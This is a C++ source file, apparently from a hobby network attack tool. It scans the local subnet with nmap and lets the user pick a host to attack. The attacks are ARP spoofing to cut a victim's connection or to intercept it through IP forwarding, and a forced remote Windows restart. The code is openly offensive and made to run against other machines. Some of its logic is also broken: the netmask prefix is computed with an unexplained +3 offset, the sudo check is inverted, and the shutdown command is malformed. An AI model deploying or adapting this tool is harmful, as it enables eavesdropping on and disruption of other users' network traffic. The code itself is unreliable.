#include "../Headers/Net.h"
#include "../Stringyst/Headers/Stringyst.h"
#include "../Menu/unicommand/Headers/unicommand.h"

#include <bitset>

Net::Net(const string& name, const usi& connectionType, const Ipv4 &userIp, const Ipv4 &gateIp, const usi &mask):
	_name(name),
	_userIp(Ipv4(userIp)),
	_gateIp(Ipv4(gateIp)),
	_mask(mask),
	_connectionType(connectionType)
{
	//Scan network when creating
	//nmap();
}

bool Net::nmap()
{
	//Clearing ips before scanning again
	_ips.clear();

	//writing nmap command
	stringstream nmapCommand;
	string nmapOption, sudo = "";
	
	if(_system("whoami").find("root") != string::npos)
	{
		sudo = "sudo ";
		nmapOption = "-sX ";
	}
	else
		nmapOption = "-sn ";
	
	nmapCommand << sudo << "nmap " << nmapOption << _userIp.toString(false) << "/" << _mask;// << " | grep Nmap scan";

	//Scanning network
	//cout << nmapCommand.str();
	system(clearCommand.c_str());
	cout << "[" << _name << "] Scanning network..." << endl;
	string stringyMap = _system(nmapCommand.str().c_str());
	system(clearCommand.c_str());

	//Extracting devices data from nmap commandline echoes
	for(string nmapAction: lExplode("\n", stringyMap))
	{
		string deviceName, deviceIp;
		vector<string> actionWords = vExplode(" ", nmapAction);
		usi ipIndex = 5;
		bool unnamedDevice = false;

		if(actionWords.size() <= 5)
		{
			ipIndex = 4;
			unnamedDevice = true;
		}
		else
			deviceName = actionWords[4];

		
		if(
			//Scanning echo
			actionWords[0] == "Nmap"
			&& actionWords[1] == "scan"
		)
		{
			
			deviceIp = rtrim(ltrim(actionWords[ipIndex], "("), ")");

			if(unnamedDevice)
				deviceName = "Device::" + deviceIp;
			
			if(deviceIp != _gateIp.toString(false) && deviceIp != _userIp.toString(false))
			{
				//cout << deviceName << " :: " << deviceIp << " -- " << Ipv4(deviceIp, deviceName).toString(true) << endl;
				//_getch();
				_ips.push_back(Ipv4(deviceIp, deviceName));
			}
		}
	}

	return !_ips.empty();
}

string Net::toString() const
{
	return _name;
}

size_t Net::getIpCount() const
{
	return _ips.size();
}

void Net::displayIpv4s()
{
	Menu ipv4sMenu;
	list<Ipv4> routers;

	for(const Ipv4 &ip : _ips)
		ipv4sMenu.addChoice(ip.toString(true));
	
	ipv4sMenu.addExit();

	while(!ipv4sMenu.leaving())
	{
		unsigned int
			chosenIpv4 = ipv4sMenu.display("[" + _name + "] Choose the Ipv4 of a machine you wish to interact with:"),
			increment = 0;

		for(const Ipv4 &ip : _ips)
			if (increment++ == chosenIpv4)
				attackMenu(ip);
	}
}

void Net::attackMenu(const Ipv4 &ip)
{
	Menu optionsMenu;

	optionsMenu.addChoice("Cut");
	optionsMenu.addChoice("Spoof");
	optionsMenu.addChoice("Shutdown");
	optionsMenu.addExit();

	while (!optionsMenu.leaving())
	{
		switch (optionsMenu.display("[" + _name + "][" + ip.getLabel() + "] Choose the interaction you want to have with it:"))
		{
		case 0:
			//Cut
			arpSpoof(false, ip);
			break;

		case 1:
			//Spoof
			arpSpoof(true, ip);
			break;

		case 2:
			//Shutdown
			shutdown(ip);
			break;
		}
	}
}

void Net::arpSpoof(bool forward, const Ipv4& target) const
{
	//Linux command [arpspoof]
	#ifdef __linux__

	if(forward && _system("whoami").find("root") == string::npos)
	{
		cout << "Spoofing requires sudo at lauching of program !" << endl;
		_getch();
		system(clearCommand.c_str());
		return;
	}

	string
		ipforwardCommand = "sudo sysctl -w net.ipv4.ip_forward=1",
		ipbackwardCommand = "sudo sysctl -w net.ipv4.ip_forward=0",
		spoofCommand = "sudo arpspoof -i " + _name + " -t " + target.toString(false) + " " + _gateIp.toString(false),
		reverseSpoofCommand = "sudo arpspoof -i " + _name + " -t " + _gateIp.toString(false) + " " + target.toString(false);

	cout << "Launching: " << endl;
	if(forward)
	{
		cout
			<< ipforwardCommand << endl
			<< spoofCommand << endl
			<< reverseSpoofCommand << endl
			<< ipbackwardCommand << endl
			<< "Leave with CTRL+C at any time if you want to" << endl
			<< "Connection will be spyed" << endl;
	}
	else
	{
		cout 
			<< spoofCommand << endl
			<< "Leave with CTRL+C at any time if you want to" << endl
			<< "Connection will be cut" << endl;
	}

	
	cout << "Push any key to run attack" << endl << endl;
	_getch();
	
	if(forward)
		system(ipforwardCommand.c_str());
	
	system(spoofCommand.c_str());

	if(forward)
	{
		system(reverseSpoofCommand.c_str());
		system(ipbackwardCommand.c_str());
	}

	system(clearCommand.c_str());
	#endif
}

void Net::shutdown(const Ipv4& target) const
{
	//Linux command [shutdown]
	#if defined(_WIN64) or defined(_WIN32)
	string shutdownCommand = "shutdown -m \\ " + target.toString(false) + "-r -f";
	system(shutdownCommand.c_str());
	#else
	cout << "This feature is enabled only in windows." << endl << "Press any key to leave" << endl;
	_getch();
	#endif
}

usi Net::maskToUsi(const string &stringyMask)
{
	vector<usi> explodedMask = Ipv4::readIp(stringyMask);

	return maskToUsi(
		explodedMask[0],
		explodedMask[1],
		explodedMask[2],
		explodedMask[3]
	);
}

usi Net::maskToUsi(const usi &word1, const usi &word2, const usi &word3, const usi &word4)
{
	//Mask's bits consist in 4 bytes
	vector<bitset<8>> words =
	{
		bitset<8>(word1),
		bitset<8>(word2),
		bitset<8>(word3),
		bitset<8>(word4)
	};
	
	//Counting bits
	usi sIndex, bIndex, ret = 0;
	for(sIndex = 0; sIndex < 4; sIndex++)
		//For each byte
		for(bIndex = 7; bIndex > 0; bIndex--)
			//For each bit
			if(words[sIndex].test(bIndex) == true)
				//Sum
				ret++;
			else
				//Return
				//I don't know why, but an offset of -3 has to be compensated
				return ret + 3;

	return 64;
}